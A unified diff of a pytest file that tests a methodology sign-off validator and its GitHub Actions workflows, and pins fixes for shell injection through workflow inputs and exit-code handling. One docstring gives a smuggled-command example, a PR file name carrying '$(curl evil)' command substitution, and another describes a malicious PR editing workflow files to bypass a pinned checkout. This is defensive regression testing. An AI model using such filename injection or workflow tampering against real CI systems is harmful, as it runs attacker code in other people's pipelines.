@@ -1379,22 +1379,16 @@ class TestStrictGhResolution:
         assert cms._resolve_strict_gh(True) is True
 
     @pytest.mark.parametrize("value", ["1", "true", "TRUE", "yes", "on", "On"])
-    def test_env_truthy_values(
-        self, monkeypatch: pytest.MonkeyPatch, value: str
-    ):
+    def test_env_truthy_values(self, monkeypatch: pytest.MonkeyPatch, value: str):
         monkeypatch.setenv("STRICT_GH", value)
         assert cms._resolve_strict_gh(None) is True
 
     @pytest.mark.parametrize("value", ["", "0", "false", "no", "off", "garbage"])
-    def test_env_falsy_values(
-        self, monkeypatch: pytest.MonkeyPatch, value: str
-    ):
+    def test_env_falsy_values(self, monkeypatch: pytest.MonkeyPatch, value: str):
         monkeypatch.setenv("STRICT_GH", value)
         assert cms._resolve_strict_gh(None) is False
 
-    def test_cli_flag_true_wins_over_env_falsy(
-        self, monkeypatch: pytest.MonkeyPatch
-    ):
+    def test_cli_flag_true_wins_over_env_falsy(self, monkeypatch: pytest.MonkeyPatch):
         monkeypatch.setenv("STRICT_GH", "0")
         # CLI flag True is the explicit operator intent; honor it.
         assert cms._resolve_strict_gh(True) is True
@@ -1422,9 +1416,7 @@ class TestStrictGhMainExitCode:
     """
 
     @staticmethod
-    def _make_results(
-        all_pass: bool = True, provenance_skipped: bool = False
-    ) -> list:
+    def _make_results(all_pass: bool = True, provenance_skipped: bool = False) -> list:
         """Build a CheckResult list with controlled ok/skip flags."""
 
         results = [
@@ -1452,9 +1444,7 @@ class TestStrictGhMainExitCode:
         all_pass: bool = True,
         provenance_skipped: bool = False,
     ) -> None:
-        results = self._make_results(
-            all_pass=all_pass, provenance_skipped=provenance_skipped
-        )
+        results = self._make_results(all_pass=all_pass, provenance_skipped=provenance_skipped)
 
         def fake_check_signoff(*args, **kwargs):  # noqa: ANN001 ANN002 ANN003
             return results
@@ -1486,8 +1476,7 @@ class TestStrictGhMainExitCode:
         rc = cms.main([str(doc), "--repo-root", str(tmp_path)])
         captured = capsys.readouterr()
         assert rc == 3, (
-            f"expected exit 3 (strict-gh policy violation), got {rc}. "
-            f"Captured: {captured}"
+            f"expected exit 3 (strict-gh policy violation), got {rc}. Captured: {captured}"
         )
         # Combined stdout + stderr — the report goes to stdout, the FAIL
         # message to stderr; both should be present.
@@ -1509,10 +1498,7 @@ class TestStrictGhMainExitCode:
         doc = self._make_doc_path(tmp_path)
         rc = cms.main([str(doc), "--repo-root", str(tmp_path)])
         captured = capsys.readouterr()
-        assert rc == 0, (
-            f"expected exit 0 (back-compat warn-only), got {rc}. "
-            f"Captured: {captured}"
-        )
+        assert rc == 0, f"expected exit 0 (back-compat warn-only), got {rc}. Captured: {captured}"
         # The CRITICAL warning should still surface on stdout (in the report
         # detail), confirming the warn behavior is preserved.
         combined = captured.out + captured.err
@@ -1528,9 +1514,7 @@ class TestStrictGhMainExitCode:
         self._patch_check_signoff(monkeypatch, provenance_skipped=True)
         monkeypatch.delenv("STRICT_GH", raising=False)
         doc = self._make_doc_path(tmp_path)
-        rc = cms.main(
-            [str(doc), "--repo-root", str(tmp_path), "--strict-gh"]
-        )
+        rc = cms.main([str(doc), "--repo-root", str(tmp_path), "--strict-gh"])
         assert rc == 3, f"expected exit 3 (CLI --strict-gh), got {rc}"
 
     def test_validation_failure_takes_precedence_over_strict_gh(
@@ -1546,15 +1530,11 @@ class TestStrictGhMainExitCode:
 
         # all_pass=False (selection_rule.ok=False) AND
         # provenance_skipped=True — exit 1 must win.
-        self._patch_check_signoff(
-            monkeypatch, all_pass=False, provenance_skipped=True
-        )
+        self._patch_check_signoff(monkeypatch, all_pass=False, provenance_skipped=True)
         monkeypatch.setenv("STRICT_GH", "1")
         doc = self._make_doc_path(tmp_path)
         rc = cms.main([str(doc), "--repo-root", str(tmp_path)])
-        assert rc == 1, (
-            f"expected exit 1 (generic validation precedence), got {rc}"
-        )
+        assert rc == 1, f"expected exit 1 (generic validation precedence), got {rc}"
 
     def test_strict_gh_pass_when_no_provenance_skip(
         self,
@@ -1594,18 +1574,8 @@ class TestReusableValidatorWorkflow:
        (contents:read + pull-requests:read).
     """
 
-    REUSABLE_PATH = (
-        PROJECT_ROOT
-        / ".github"
-        / "workflows"
-        / "methodology-signoff-validator.yml"
-    )
-    CALLER_PATH = (
-        PROJECT_ROOT
-        / ".github"
-        / "workflows"
-        / "methodology_signoff_guard.yml"
-    )
+    REUSABLE_PATH = PROJECT_ROOT / ".github" / "workflows" / "methodology-signoff-validator.yml"
+    CALLER_PATH = PROJECT_ROOT / ".github" / "workflows" / "methodology_signoff_guard.yml"
 
     def _parse(self, path: Path):
         yaml = pytest.importorskip("yaml")
@@ -1621,9 +1591,7 @@ class TestReusableValidatorWorkflow:
         # PyYAML interprets bare `on:` keys as boolean True; accept either.
         on_block = parsed.get("on") or parsed.get(True)
         assert on_block is not None, "reusable workflow missing on: block"
-        assert "workflow_call" in on_block, (
-            "reusable workflow must use on: workflow_call: trigger"
-        )
+        assert "workflow_call" in on_block, "reusable workflow must use on: workflow_call: trigger"
 
     def test_reusable_workflow_declares_required_inputs(self):
         parsed = self._parse(self.REUSABLE_PATH)
@@ -1676,9 +1644,7 @@ class TestReusableValidatorWorkflow:
         assert perms.get("pull-requests") == "read"
         # Defensive: ensure no write permissions creep in.
         for key, value in perms.items():
-            assert value == "read", (
-                f"H2/M1: permissions must be read-only; got {key}={value!r}"
-            )
+            assert value == "read", f"H2/M1: permissions must be read-only; got {key}={value!r}"
 
     def test_caller_delegates_to_reusable_workflow(self):
         text = self.CALLER_PATH.read_text(encoding="utf-8")
@@ -1686,10 +1652,9 @@ class TestReusableValidatorWorkflow:
         # than running python3 inline. Path-pinned same-repo invocation
         # is the baseline; future migration to cross-repo SHA-pinned
         # invocation is documented in the workflow header.
-        assert (
-            "uses: ./.github/workflows/methodology-signoff-validator.yml"
-            in text
-        ), "H3: caller must delegate to the reusable validator workflow"
+        assert "uses: ./.github/workflows/methodology-signoff-validator.yml" in text, (
+            "H3: caller must delegate to the reusable validator workflow"
+        )
         # Caller passes strict_gh: '1' so production CI hits fail-closed.
         assert "strict_gh: '1'" in text
         # Caller pins validator_ref to 'main' (the protected ref).
@@ -1704,4 +1669,152 @@ class TestReusableValidatorWorkflow:
         assert "python3 /tmp/governance/check_methodology_signoff.py" not in text, (
             "H3: caller must delegate to reusable workflow, not invoke "
             "validator inline (the inline invocation was the H3 threat)"
+        )
+
+    def test_no_direct_input_interpolation_in_run_blocks(self):
+        """Codex pass-1 HIGH-2 regression pin: inputs must route through env.
+
+        Direct ``${{ inputs.X }}`` interpolation inside ``run:`` blocks
+        is a shell-injection sink because GitHub Actions expression
+        substitution happens before bash parses the line. Inputs must
+        be exposed via ``env:`` so bash treats their values as data,
+        never as code. This test forbids the dangerous pattern in the
+        body of any run-script.
+
+        We allow ``${{ inputs.X }}`` only inside ``env:`` blocks (where
+        it becomes a shell variable assignment) and inside ``with:``
+        blocks (parameters to actions). Anywhere else inside a
+        ``run: |`` body is forbidden.
+        """
+
+        # Ensure pyyaml is importable; self._parse() uses it.
+        pytest.importorskip("yaml")
+        parsed = self._parse(self.REUSABLE_PATH)
+        # Walk the YAML and find every `run:` value; assert the dangerous
+        # patterns don't appear inside.
+        offenders: list[tuple[str, str]] = []
+
+        def scan_steps(steps: list, job_name: str) -> None:
+            for step in steps:
+                run_block = step.get("run")
+                if not isinstance(run_block, str):
+                    continue
+                step_name = step.get("name", "<unnamed>")
+                # Forbid `${{ inputs.<name> }}` inside the run block.
+                if "${{ inputs." in run_block:
+                    offenders.append((f"{job_name}::{step_name}", run_block[:200]))
+
+        for job_name, job in parsed.get("jobs", {}).items():
+            steps = job.get("steps", [])
+            scan_steps(steps, job_name)
+
+        assert not offenders, (
+            "Codex pass-1 HIGH-2: ${{ inputs.X }} interpolation inside "
+            "run: blocks is a shell-injection sink. Route the input "
+            "through env: instead. Offenders:\n"
+            + "\n".join(f"  {n}: {body!r}" for n, body in offenders)
+        )
+
+    def test_touched_files_routed_through_env(self):
+        """HIGH-2 specific pin: touched_files must be in env: not direct interp.
+
+        ``touched_files`` carries PR-influenced data (file paths from
+        the diff) that matches a broad workflow path glob. A PR can add
+        a file with a name like
+        ``optum_methodology_signoff_$(curl evil).md`` — if that string
+        is interpolated directly via ``${{ inputs.touched_files }}``
+        into a here-string, command-substitution executes before bash
+        sees the line. Routing via ``env: TOUCHED_FILES: ...`` and
+        reading ``$TOUCHED_FILES`` in the script is the canonical fix.
+        """
+
+        text = self.REUSABLE_PATH.read_text(encoding="utf-8")
+        # Positive assertion: TOUCHED_FILES env var must be defined.
+        assert "TOUCHED_FILES: ${{ inputs.touched_files }}" in text, (
+            "HIGH-2: touched_files must be exposed via env: TOUCHED_FILES"
+        )
+        # Negative assertion: the dangerous interpolation must not appear
+        # inside any here-string. We allow it inside an env: block.
+        # Forbid the specific bash sink pattern.
+        assert '<<< "${{ inputs.touched_files }}"' not in text, (
+            'HIGH-2: <<< "${{ inputs.touched_files }}" is a shell-'
+            'injection sink. Use <<< "$TOUCHED_FILES" instead.'
+        )
+
+    def test_validator_exit_code_3_preserved_by_workflow(self):
+        """Codex pass-1 LOW-4 regression pin: workflow must preserve exit 3.
+
+        The Python validator reserves exit 3 for STRICT_GH provenance
+        gaps. The workflow's ``if ! python3 ...; then STATUS=1`` pattern
+        collapses every non-zero into 1, undercutting the contract for
+        log scrapers. The fix uses ``${PIPESTATUS[0]}`` to capture the
+        validator's actual exit code and a priority rule that preserves
+        3 unless 1 has occurred (mirrors the Python main()'s precedence).
+        """
+
+        text = self.REUSABLE_PATH.read_text(encoding="utf-8")
+        # Positive: PIPESTATUS must be used to capture the validator rc.
+        assert "PIPESTATUS[0]" in text, (
+            "LOW-4: workflow must capture validator exit code via "
+            "${PIPESTATUS[0]} to preserve exit 3"
+        )
+        # Positive: priority logic must be present (1 > 3 > 0).
+        assert 'STATUS"' in text and "ARTIFACT_RC" in text, (
+            "LOW-4: workflow must implement exit-code priority "
+            "(rc=1 > rc=3 > rc=0) so generic-validation failures still "
+            "win over strict-gh failures"
+        )
+        # Negative: parse the YAML and inspect each `run:` block (not
+        # comments) for the `if ! python3 ` pattern. The fix replaces
+        # that with `python3 ...; ARTIFACT_RC=${PIPESTATUS[0]}`.
+        parsed = self._parse(self.REUSABLE_PATH)
+        bad_steps: list[str] = []
+        for job_name, job in parsed.get("jobs", {}).items():
+            for step in job.get("steps", []):
+                run_block = step.get("run")
+                if not isinstance(run_block, str):
+                    continue
+                # Strip comment lines so the check is on actual shell code.
+                code_lines = [
+                    line for line in run_block.splitlines() if not line.lstrip().startswith("#")
+                ]
+                code_only = "\n".join(code_lines)
+                if "if ! python3 " in code_only:
+                    bad_steps.append(f"{job_name}::{step.get('name', '<unnamed>')}")
+        assert not bad_steps, (
+            "LOW-4: the `if ! python3 ...` pattern collapses every "
+            "validator non-zero into STATUS=1, masking exit 3. Use "
+            "PIPESTATUS-based capture instead. Offenders: " + ", ".join(bad_steps)
+        )
+
+    def test_threat_model_documented_honestly(self):
+        """Codex pass-1 HIGH-1 pin: H3 status text must reflect partial close.
+
+        Initial framing claimed H3 was fully RESOLVED by the
+        reusable-workflow split. Codex pass-1 HIGH-1 corrected this:
+        same-repo path-pinned `uses: ./...` loads the called workflow
+        YAML from caller's ref, so a malicious PR can edit BOTH workflow
+        files in one commit and disable the `ref: main` checkout. The
+        validator script pin IS load-bearing; the workflow YAML pinning
+        is NOT. This test pins the honest documentation.
+        """
+
+        n3_doc = PROJECT_ROOT / "docs" / "governance" / "n3_known_limitations_20260510.md"
+        text = n3_doc.read_text(encoding="utf-8")
+        # The H3 section must mark status as PARTIALLY RESOLVED, not RESOLVED.
+        # The summary table must reflect the partial close.
+        assert "PARTIALLY RESOLVED" in text, (
+            "HIGH-1: n3_known_limitations doc must mark H3 status as "
+            "PARTIALLY RESOLVED, not RESOLVED, until cross-repo "
+            "SHA-pinned migration lands"
+        )
+        # The doc must reference the codex pass-1 HIGH-1 honesty correction.
+        assert "codex pass-1 HIGH-1" in text or "HIGH-1" in text, (
+            "HIGH-1: doc must explicitly reference the codex finding "
+            "that prompted the honesty correction"
+        )
+        # The caller workflow header must also reflect the same nuance.
+        caller_text = self.CALLER_PATH.read_text(encoding="utf-8")
+        assert "PARTIALLY RESOLVED" in caller_text or "partial" in caller_text.lower(), (
+            "HIGH-1: caller workflow header must reflect the partial-close status of H3"
         )
